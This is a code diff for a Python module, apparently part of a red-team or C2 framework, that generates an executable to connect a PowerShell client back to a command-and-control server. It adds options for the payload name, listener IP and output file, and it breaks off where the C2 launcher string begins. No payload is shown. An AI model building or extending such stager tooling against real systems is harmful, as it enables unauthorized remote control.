@@ -4,7 +4,7 @@ import subprocess
 from template import Procedure
 
 class multi_stage_channels(Module):
-	""" Description Here
+	""" Genera un ejecutable para conectar un cliente al servidor c2 (transportc2)
 
 	Author:  your name (your email)
 	Version: 1.0
@@ -13,30 +13,47 @@ class multi_stage_channels(Module):
 	#MODULE OPTIONS
 	config  = Config({
         Option(
-            'OPT', 												#option
-            "Description", 										#description
-            True,												#Required = True, Optional = False
-            #set_callback=lambda o: o.root._set_app_folder(), 	#execute a function if required
-        ): "default", 											#Default value	
+            'PAYLOAD',
+            "Name of the ps1 payload.",
+            True,
+            #set_callback=lambda o: o.root._set_app_folder(),
+        ): "my_client",
+         Option(
+            'LHOST',
+            "Your IP address.",
+            True,
+            #set_callback=lambda o: o.root._set_logging(o.value),
+        ): "0.0.0.0",
+        Option(
+            'EXE_NAME',
+            "Name of the EXE.",
+            True,
+            #set_callback=lambda o: o.root._set_logging(o.value),
+        ): "name.c",
+		Option(
+            'OUTPUT',
+            "Path of the output folder.",
+            True,
+            #set_callback=lambda o: o.root._set_logging(o.value),
+        ): " ",
     })
 
 	def run(self):
-		#Webroot
 		parent_path = "Prueba/sourcecodes/"
 		parent_webroot_path = "Prueba/webroot/"
 
-		c2client = ''.join(list(self.config.get('OPT'))) #Assign option value to variable
 
-		#TEST ARGUMENTS
+		c2client = ''.join(list(self.config.get('PAYLOAD')))
+		ipaddr   = ''.join(list(self.config.get('LHOST')))
+		name     = ''.join(list(self.config.get('EXE_NAME')))
+
 
 		c2client = "client.ps1"
-		'''
 		ipaddr = "10.10.1.13"
 		name = 'ejecutarPSs.cpp'
 		fullname = parent_path+name
 		exename = "envia"
 		outfile = parent_webroot_path + exename
-		'''
 
 
 		STARTC2 = '''
